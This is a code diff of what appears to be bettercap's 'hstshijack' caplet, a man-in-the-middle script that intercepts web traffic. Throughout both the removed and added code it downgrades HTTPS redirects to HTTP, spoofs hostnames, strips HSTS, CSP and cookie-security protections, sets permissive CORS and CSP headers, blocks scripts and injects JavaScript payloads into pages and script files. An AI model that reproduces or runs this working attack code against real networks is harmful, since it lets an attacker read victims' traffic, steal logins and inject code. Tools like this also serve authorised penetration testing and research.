+				if ( req.Hostname.match(regexp) ) {
+					// Restore requested hostname if it was spoofed
+					var intended_host
+					for (var b = 0; b < replacement_hosts.length; b++) {
+						if ( replacement_hosts.indexOf("*") != -1 ) {
+							regexp = toWholeWildcardRegexp(replacement_hosts[b])
+						} else {
+							regexp = toWholeRegexp(replacement_hosts[b])
+						}
+						if ( req.Hostname.match(regexp) ) {
+							var replacement
+							if (replacement_hosts[b].indexOf("*") != -1) {
+								replacement = "$1" + target_hosts[b].replace("*.", "")
+							} else {
+								replacement = target_hosts[b]
+							}
+							intended_host = req.Hostname.replace(regexp, replacement)
+							res.SetHeader( "Location", "https://" + intended_host + req.Path + ( req.Query != "" ? ("?" + req.Query) : "" ) )
+							res.Status = 301
+							break
+						}
+					}
+					res.SetHeader("bettercap", "ignore")
+					ignored = true
+					log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client + reset + " from " + bold + req.Hostname + reset + " to " + bold + intended_host + reset + " because we received a whitelist callback.")
+					break
+				}
+			}
+		}
+
+		if (!ignored) {
+
+		/* Patch Request */
+
+			// Patch spoofed hostnames.
+			for (var a = 0; a < target_hosts.length; a++) {
+				// Patch spoofed hostnames in headers.
+				var regexp
+				if ( replacement_hosts[a].indexOf("*") != -1 ) {
+					regexp = toWildcardRegexp(replacement_hosts[a])
+				} else {
+					regexp = toRegexp(replacement_hosts[a])
+				}
+				if ( req.Headers.match(regexp) ) {
+					req.Headers = req.Headers.replace( regexp, "$1" + target_hosts[a].replace("*.", "") + "$2" )
+					log_debug(on_blue + "hstshijack" + reset + " Patched spoofed hostname(s) in request header(s).")
+				}
+
+				// Patch spoofed hostname of request.
+				if ( replacement_hosts[a].indexOf("*") != -1 ) {
+					regexp = toWholeWildcardRegexp(replacement_hosts[a])
+				} else {
+					regexp = toWholeRegexp(replacement_hosts[a])
+				}
+				if ( req.Hostname.match(regexp) ) {
+					spoofed_host = req.Hostname
+					if ( replacement_hosts[a].indexOf("*") != -1 ) {
+						req.Hostname = req.Hostname.replace( regexp, "$1" + target_hosts[a].replace("*.", "") )
+					} else {
+						req.Hostname = req.Hostname.replace(regexp, target_hosts[a])
+					}
+					req.Scheme   = "https"
+					log_debug(on_blue + "hstshijack" + reset + " Patched spoofed hostname " + bold + spoofed_host + reset + " to " + bold + req.Hostname + reset + " and set scheme to HTTPS.")
+				}
+			}
+
+			// Patch SSL in headers if we know host uses SSL.
+			for (var a = 0; a < ssl_log.length; a++) {
+				regexp = new RegExp( "http://" + ssl_log[a].replace(/\./g, "\\.").replace(/\-/g, "\\-") + "([^a-z0-9\\-\\.]|$)", "ig" )
+				if ( req.Headers.match(regexp) ) {
+					req.Headers = req.Headers.replace(regexp, "https://" + ssl_log[a] + "$1")
+					log_debug(on_blue + "hstshijack" + reset + " Patched SSL of " + ssl_log[a] + " in request headers.")
+				}
+			}
+
+			// Patch scheme of request if host is found in SSL log.
+			if (req.Scheme != "https") {
+				if ( ssl_log.indexOf(req.Hostname) > -1 ) {
+					req.Scheme = "https"
+					log_debug(on_blue + "hstshijack" + reset + " Found " + bold + req.Hostname + reset + " in SSL log. Upgraded scheme to HTTPS.")
+				} else {
+					for (var i = 0; i < target_hosts; i++) {
+						var regexp
+						if ( target_hosts[i].indexOf("*") != -1 ) {
+							regexp = toWholeWildcardRegexp(target_hosts[i])
+						} else {
+							regexp = toWholeRegexp(target_hosts[i])
+						}
+						if ( req.Hostname.match(regexp) ) {
+							req.Scheme = "https"
+							log_debug(on_blue + "hstshijack" + reset + " Found " + bold + req.Hostname + reset + " in hstshijack.targets. Upgraded scheme to HTTPS.")
+						}
+					}
+				}
+			}
+
+		}
+
+	}
+
 }
 
 function onResponse(req, res) {
-  res.ReadBody();
 
-  /* Remember HTTPS redirects. */
-  location = res.GetHeader("Location", "");
-  if (location.match(selector_uri_one)) {
-    host = location.replace(selector_uri_two, "$1");
-    if (host !== "") {
-      indexDomain(host);
-    }
-  }
+/* Remember HTTPS redirects */
 
-  /* Ignore this response if whitelisted. */
-  if (whitelist[req.Client.IP]) {
-    if (whitelist[req.Client.IP].indexOf(req.Hostname) !== -1) {
-      log_debug(on_blue + "hstshijack" + reset + " Ignoring response from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset + ".");
-      return;
-    }
-  } else {
-    for (a = 0; a < ignore_hosts.length; a++) {
-      var whole_regexp_set;
-      if (ignore_hosts[a] !== "*") {
-        whole_regexp_set = toWholeRegexpSet(ignore_hosts[a], "");
-      }
+	// Write to SSL log.
+	// Check if host responded with HTTPS redirection.
+	location = res.GetHeader("Location", "")
+	if ( location.match(/^https:\/\//i) ) {
+		ssl_log = readFile( env["hstshijack.log"] ).split("\n")
+		host    = location.replace(/https:\/\//, "").replace(/\/.*/, "")
+		if ( ssl_log.indexOf(host) == -1 ) {
+			ssl_log.push(host)
+			writeFile( env["hstshijack.log"], ssl_log.join("\n") )
+			log_debug(on_blue + "hstshijack" + reset + " Saved " + host + " to SSL log.")
+		}
+	}
 
-      if (
-           ignore_hosts[a] === "*"
-        || req.Hostname.match(whole_regexp_set[0])
-      ) {
-        log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".");
-        return;
-      }
-    }
+/* Attack or ignore response */
 
-    /* Spoof markup bodies. */
-    if (
-         res.ContentType.match(selector_content_type_html)
-      || req.Path.match(selector_extension_html)
-    ) {
-      /* Prevent meta tag induced CSP restrictions. */
-      res.Body = res.Body.replace(
-        selector_meta_tag_csp,
-        "$1");
+	ignored = false
 
-      /* Block scripts. */
-      for (a = 0; a < block_script_hosts.length; a++) {
-        if (
-             block_script_hosts[a] === "*"
-          || req.Hostname.match(toWholeRegexpSet(block_script_hosts[a], "")[0])
-        ) {
-          res.Body = res.Body.replace(selector_html_script_open_tag, "<div style=\"display:none;\"$1");
-          res.Body = res.Body.replace(selector_html_script_close_tag, "</div$1");
-          log_debug(on_blue + "hstshijack" + reset + " Blocked inline script tags in a document from " + bold + req.Hostname + reset + ".");
-          break;
-        }
-      }
+	// Ignore this response if required.
+	if ( res.GetHeader("bettercap", "") == "ignore" ) {
+		res.RemoveHeader("bettercap")
+		ignored = true
+		log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".")
+	} else {
+		for (var a = 0; a < ignore_hosts.length; a++) {
+			var regexp
+			if ( ignore_hosts[a].indexOf("*") != -1 ) {
+				regexp = toWholeWildcardRegexp(ignore_hosts[a])
+			} else {
+				regexp = toWholeRegexp(ignore_hosts[a])
+			}
+			if ( req.Hostname.match(regexp) ) {
+				ignored = true
+				// Don't ignore response if there's a replacement for the requested host.
+				for (var b = 0; b < target_hosts.length; b++) {
+					if ( target_hosts[b].indexOf("*") != -1 ) {
+						regexp = toWholeWildcardRegexp(target_hosts[b])
+					} else {
+						regexp = toWholeRegexp(target_hosts[b])
+					}
+					if ( req.Hostname.match(regexp) ) {
+						ignored = false
+						break
+					}
+				}
+				// Don't ignore response if there's a custom payload for the requested host.
+				if (ignored) {
+					for ( var b = 0; b < Object.keys(custom_payloads).length; b++ ) {
+						custom_payload_host = Object.keys(custom_payloads)[b].replace(/\:.*/, "")
+						if ( custom_payload_host.indexOf("*") != -1 ) {
+							regexp = toWholeWildcardRegexp(custom_payload_host)
+						} else {
+							regexp = toWholeRegexp(custom_payload_host)
+						}
+						if ( req.Hostname.match(regexp) ) {
+							ignored = false
+							break
+						}
+					}
+				}
+				if (ignored) {
+					log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".")
+				}
+				break
+			}
+		}
+	}
 
-      /* Inject payloads. */
-      injection = "";
-      for (a = 0; a < Object.keys(payloads).length; a++) {
-        injecting_host = Object.keys(payloads)[a];
-        if (
-             injecting_host === "*"
-          || req.Hostname.match(toWholeRegexpSet(injecting_host, "")[0])
-        ) {
-          injection = injection + payloads[injecting_host];
-        }
-      }
-      if (injection !== "") {
-        if (res.Body.slice(0, 1000).match(selector_html_magic)) {
-          res.Body = 
-            "<script>\n" +
-            payload_container_prefix + injection + payload_container_suffix +
-            "</script>\n" +
-            res.Body;
-        }
-        log_debug(on_blue + "hstshijack" + reset + " Injected document from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);
-      }
-    }
+	if (!ignored) {
+		res.ReadBody()
 
-    /* Spoof JavaScript bodies. */
-    if (res.ContentType.match(selector_content_type_js)) {
-      /* Block scripts. */
-      for (a = 0; a < block_script_hosts.length; a++) {
-        if (
-             block_script_hosts[a] === "*"
-          || req.Hostname.match(toWholeRegexpSet(block_script_hosts[a], "")[0])
-        ) {
-          res.Body = "";
-          log_debug(on_blue + "hstshijack" + reset + " Cleared JavaScript resource from " + bold + req.Hostname + reset + ".");
-          break;
-        }
-      }
+	/* Attack meta tag redirection */
 
-      /* Inject payloads. */
-      injection = "";
-      for (a = 0; a < Object.keys(payloads).length; a++) {
-        injecting_host = Object.keys(payloads)[a];
-        if (
-             injecting_host === "*"
-          || req.Hostname.match(toWholeRegexpSet(injecting_host, "")[0])
-        ) {
-          injection = injection + payloads[injecting_host];
-        }
-      }
-      if (injection !== "") {
-        res.Body = payload_container_prefix + injection + payload_container_suffix + res.Body;
-        log_debug(on_blue + "hstshijack" + reset + " Injected JavaScript file from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);
-      }
-    }
+		// SSLstrip meta tag redirection.
+		if ( res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")/ig) ) {
+			meta_tags = res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")(.*?)(\/\s*|)>/ig) || []
+			for (var a = 0; a < meta_tags.length; a++) {
+				log_debug(on_blue + "hstshijack" + reset + " Found " + meta_tags.length + " meta tag(s) in the response body.")
 
-    /* Strip SSL from location headers. */
-    res.Headers = res.Headers
-      .replace(selector_scheme_http_https_colon, "$1:")
-      .replace(selector_port_https, "$1");
+				if ( meta_tags[a].match(/https:\/\//ig) ) {
+					replacement = meta_tags[a].replace(/https:\/\//ig, "http://")
+					res.Body.replace(meta_tags[a], replacement)
+					log_debug(on_blue + "hstshijack" + reset + " Stripped meta tag(s) from SSL.")
+				}
 
-    /* Spoof hosts in headers. */
-    for (a = 0; a < target_hosts.length; a++) {
-      regexp_set = toRegexpSet(target_hosts[a], replacement_hosts[a]);
-      res.Headers = res.Headers.replace(regexp_set[0], regexp_set[1]);
-    }
+				// Hijack hostnames in redirecting meta tags.
+				for (var b = 0; b < target_hosts.length; b++) {
+					// regexp  = new RegExp( target_hosts[b].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "([a-z0-9\\-]*\\.)") + "()", "ig" )
+					var regexp
+					if ( target_hosts[b].indexOf("*") != -1 ) {
+						regexp = toWildcardRegexp(target_hosts[b])
+					} else {
+						regexp = toRegexp(target_hosts[b])
+					}
+					if ( meta_tags[a].match(regexp) ) {
+						hijacked_meta_tag = "$1" + meta_tags[a].replace( regexp, replacement_hosts.replace("*.", "") ) + "$2"
+						res.Body = res.Body.replace(meta_tags[a], hijacked_meta_tag)
+						log_debug(on_blue + "hstshijack" + reset + " Hijacked meta tag by replacing " + bold + target_hosts[b] + reset + " with " + bold + replacement_hosts[b] + reset + ".")
+					}
+				}
+			}
+		}
 
-    /* Remove secure cookie settings. */
-    new_headers = "";
-    res.Headers.split("\r\n").forEach(function(headerString){
-      if (headerString !== "") {
-        matches = headerString.match(selector_header);
-        if (matches.length >= 3) {
-          header_name = matches[1];
-          header_value = matches[2];
-          if (header_name.match(selector_header_set_cookie)) {
-            new_header_value = "";
-            cookie_params = header_value.split(";");
-            cookie_params.forEach(function(cookie_param){
-              if (cookie_param !== "") {
-                stripped_cookie_param = cookie_param.match(selector_strip_whitespace)[1];
-                if (!stripped_cookie_param.match(selector_header_set_cookie_secure_samesite)) {
-                  if (new_header_value === "") {
-                    new_header_value = stripped_cookie_param;
-                  } else {
-                    new_header_value += "; " + stripped_cookie_param;
-                  }
-                }
-              }
-            });
-            new_headers += header_name + ": " + new_header_value + "\r\n";
-          } else {
-            new_headers += header_name + ": " + header_value + "\r\n";
-          }
-        }
-      }
-    });
+	/* Attack meta tag CSP restrictions */
 
-    /* Remove security headers. */
-    res.Headers = res.Headers.replace(selector_header_csp, "");
-    res.RemoveHeader("Strict-Transport-Security");
-    res.RemoveHeader("Content-Security-Policy-Report-Only");
-    res.RemoveHeader("Public-Key-Pins");
-    res.RemoveHeader("Public-Key-Pins-Report-Only");
-    res.RemoveHeader("X-Frame-Options");
-    res.RemoveHeader("X-Content-Type-Options");
-    res.RemoveHeader("X-Download-Options");
-    res.RemoveHeader("X-Permitted-Cross-Domain-Policies");
-    res.RemoveHeader("X-XSS-Protection");
-    res.RemoveHeader("Expect-Ct");
+		res.Body = res.Body.replace(/http-equiv=('|")Content-Security-Policy('|")/ig, "http-equiv=$1Content-Insecure-Policy$2")
 
-    /* Set insecure headers. */
-    allowed_origin = res.GetHeader("Access-Control-Allow-Origin", "*");
-    if (allowed_origin !== "*") {
-      for (a = 0; a < target_hosts.length; a++) {
-        regexp_set = toRegexpSet(target_hosts[a], replacement_hosts[a]);
-        if (allowed_origin.match(regexp_set[0])) {
-          allowed_origin = allowed_origin.replace(regexp_set[0], regexp_set[1]);
-          break;
-        }
-      }
-    }
-    res.SetHeader("Content-Security-Policy", "default-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: filesystem: 'unsafe-inline'; img-src * data: blob: filesystem: 'unsafe-inline'; frame-src * data: blob: filesystem: 'unsafe-inline'; object-src * data: blob: filesystem: 'unsafe-inline'; style-src * data: blob: filesystem: 'unsafe-inline'; report-uri x");
-    res.SetHeader("X-WebKit-CSP", "default-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: filesystem: 'unsafe-inline'; img-src * data: blob: filesystem: 'unsafe-inline'; frame-src * data: blob: filesystem: 'unsafe-inline'; object-src * data: blob: filesystem: 'unsafe-inline'; style-src * data: blob: filesystem: 'unsafe-inline'; report-uri x");
-    res.SetHeader("X-Content-Security-Policy", "default-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: filesystem: 'unsafe-inline'; img-src * data: blob: filesystem: 'unsafe-inline'; frame-src * data: blob: filesystem: 'unsafe-inline'; object-src * data: blob: filesystem: 'unsafe-inline'; style-src * data: blob: filesystem: 'unsafe-inline'; report-uri x");
-    res.SetHeader("Access-Control-Allow-Credentials", "true");
-    res.SetHeader("Access-Control-Allow-Origin", allowed_origin);
-    res.SetHeader("Access-Control-Allow-Methods", "*");
-    res.SetHeader("Access-Control-Allow-Headers", "*");
-    res.SetHeader("Cache-Control", "no-cache, no-store, must-revalidate");
-    res.SetHeader("Expires", "Fri, 20 Apr 2018 04:20:00 GMT");
-    res.SetHeader("Pragma", "no-cache");
-  }
+	/* JavaScript */
+
+		// Block scripts on this host if required.
+		for (var i = 0; i < block_script_hosts.length; i++) {
+			var regexp
+			if ( block_script_hosts[i].indexOf("*") != -1 ) {
+				regexp = toWholeWildcardRegexp(block_script_hosts[i])
+			} else {
+				regexp = toWholeRegexp(block_script_hosts[i])
+			}
+			if ( req.Hostname.match(regexp) ) {
+				res.Body = res.Body.replace(/<script.*?>/ig, "<div style=\"display:none;\">")
+				res.Body = res.Body.replace(/<\/script>/ig, "</div>")
+				if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
+					res.Body = ""
+				}
+				log_debug(on_blue + "hstshijack" + reset + " Blocked script(s) from " + bold + req.Hostname + reset + ".")
+				break
+			}
+		}
+
+		// Inject payloads.
+		if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) || res.Body.match(/<head[^>]*?>/i) ) {
+			injection = payload
+
+			for ( var a = 0; a < Object.keys(custom_payloads).length; a++ ) {
+				host = Object.keys(custom_payloads)[a]
+
+				var regexp
+
+				if ( host.indexOf("*") != -1 ) {
+					regexp = toWholeWildcardRegexp(host)
+				} else {
+					regexp = toWholeRegexp(host)
+				}
+
+				if ( req.Hostname.match(regexp) ) {
+					injection = injection.replace("{{custom_payload}}", custom_payloads[host].payload + "\n{{custom_payload}}")
+					log_debug(on_blue + "hstshijack" + reset + " Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
+				}
+			}
+
+			injection = injection.replace("{{custom_payload}}", "")
+
+			if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
+				res.Body = injection.replace(/.*/g, injection) + res.Body // Replace once more to unescape "$$$$$$$$" to a single "$"
+				log_debug(on_blue + "hstshijack" + reset + " Injected payloads into JS file from " + bold + req.Hostname + reset + ".")
+			} else if ( res.Body.match(/<head[^>]*?>/i) ) {
+				if (encode) {
+					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script src=\"data:application/javascript;base64," + btoa(injection) + "\"></script>")
+				} else {
+					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script>" + injection + "</script>")
+				}
+				log_debug(on_blue + "hstshijack" + reset + " Injected payloads into HTML file from " + bold + req.Hostname + reset + ".")
+			}
+		}
+
+	/* Response headers */
+
+		// SSLstrip location header.
+		location = res.GetHeader("Location", "")
+		if (location != "") {
+			res.SetHeader( "Location", location.replace(/(http)s:\/\//i, "$1://") )
+			log_debug(on_blue + "hstshijack" + reset + " Stripped SSL from location header.")
+		}
+
+		// Replace hosts in headers.
+		for (var a = 0; a < target_hosts.length; a++) {
+			var regexp
+			if ( target_hosts[a].indexOf("*") != -1 ) {
+				regexp = toWildcardRegexp(target_hosts[a])
+			} else {
+				regexp = toRegexp(target_hosts[a])
+			}
+			if ( res.Headers.match(regexp) ) {
+				res.Headers = res.Headers.replace( regexp, "$1" + replacement_hosts[a].replace("*.", "") + "$2" )
+				log_debug(on_blue + "hstshijack" + reset + " Replaced " + bold + target_hosts[a] + reset + " with " + bold + replacement_hosts[a] + reset + " in header(s).")
+			}
+		}
+
+		// Remove security headers.
+		res.RemoveHeader("Strict-Transport-Security")
+		res.RemoveHeader("Content-Security-Policy-Report-Only")
+		res.RemoveHeader("Public-Key-Pins")
+		res.RemoveHeader("Public-Key-Pins-Report-Only")
+		res.RemoveHeader("X-Frame-Options")
+		res.RemoveHeader("X-Content-Type-Options")
+		res.RemoveHeader("X-WebKit-CSP")
+		res.RemoveHeader("X-Content-Security-Policy")
+		res.RemoveHeader("X-Download-Options")
+		res.RemoveHeader("X-Permitted-Cross-Domain-Policies")
+		res.RemoveHeader("X-XSS-Protection")
+		res.RemoveHeader("Expect-Ct")
+
+		// Set insecure headers.
+		res.SetHeader("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
+		res.SetHeader("Access-Control-Allow-Origin", "*")
+		res.SetHeader("Access-Control-Allow-Methods", "*")
+		res.SetHeader("Access-Control-Allow-Headers", "*")
+		res.SetHeader("Cache-Control", "no-cache, no-store, must-revalidate")
+		res.SetHeader("Expires", "Fri, 20 Apr 2018 04:20:00 GMT")
+		res.SetHeader("Pragma", "no-cache")
+
+	}
+
 }
-
